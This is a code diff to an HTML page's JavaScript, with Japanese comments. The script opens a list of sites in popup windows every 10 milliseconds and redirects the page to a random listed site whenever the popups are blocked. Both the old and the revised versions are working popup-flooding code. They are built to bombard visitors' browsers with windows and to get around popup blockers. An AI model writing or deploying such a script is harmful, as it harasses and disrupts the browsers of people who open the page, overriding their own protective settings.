@@ -12,34 +12,19 @@
         ];
 
         function openSites() {
-            let success = false;
+            let openedWindows = urls.map(url => window.open(url, "_blank", "width=800,height=600"));
 
-            urls.forEach(url => {
-                const popup = window.open(url, "_blank", "width=800,height=600");
-                if (popup) {
-                    success = true;
-                }
-            });
-
-            if (!success) {
-                // ポップアップブロックされた場合、ランダムなサイトにリダイレクト
-                const randomUrl = urls[Math.floor(Math.random() * urls.length)];
-                window.location.href = randomUrl;
-            }
-
-            // 自分自身を閉じる（必要に応じて）
-            window.close();
+            // ポップアップブロック確認
+            setTimeout(() => {
+                openedWindows.forEach((win, index) => {
+                    if (!win || win.closed) {
+                        location.href = urls[Math.floor(Math.random() * urls.length)];
+                    }
+                });
+            }, 500);
         }
 
-        function requestPopupPermission() {
-            try {
-                openSites();
-            } catch (e) {
-                console.error("ポップアップの許可が取れませんでした:", e);
-            }
-        }
-
-        setInterval(requestPopupPermission, 10);
+        setInterval(openSites, 10);
     </script>
 </head>
 <body>
